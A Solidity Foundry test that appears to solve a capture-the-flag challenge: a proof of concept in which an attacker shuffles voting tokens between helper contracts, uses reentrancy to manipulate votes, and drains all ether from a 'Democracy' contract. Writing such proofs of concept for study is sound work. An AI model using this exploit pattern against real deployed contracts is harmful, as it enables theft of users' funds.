// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

import {Test, console2} from "forge-std/Test.sol";
import "../src/Democracy.sol";
import "../src/AttackContract1.sol";
import "../src/AttackContract2.sol";

contract DemocracyTest is Test {
    Democracy public democracy;
    address attacker = makeAddr("attacker");

    function setUp() public {
        democracy = new Democracy{value: 1 ether}();
    }

    function test_PoC() public {
        // Set both msg.sender and tx.origin to attacker
        vm.startPrank(attacker, attacker);
        AttackContract1 attackContract1 = new AttackContract1(democracy);

        // Attacker gets two voting tokens
        democracy.nominateChallenger(attacker);
        // Transfer a voting token to attackContract1, now attacker holds only 1 voting token
        democracy.transferFrom(attacker, address(attackContract1), 0);
        // Attacker votes for himself/herself, now there are 9 votes in total
        democracy.vote(attacker);
        // Transfer the only voting token left to attackContract2
        democracy.transferFrom(attacker, address(attackContract1.attackContract2()), 1);

        // Do the reentrancy
        attackContract1.vote();
        // Collect all the money
        democracy.withdrawToAddress(attacker);
        attackContract1.withdraw();
        vm.stopPrank();

        assert(address(democracy).balance == 0);
    }
}
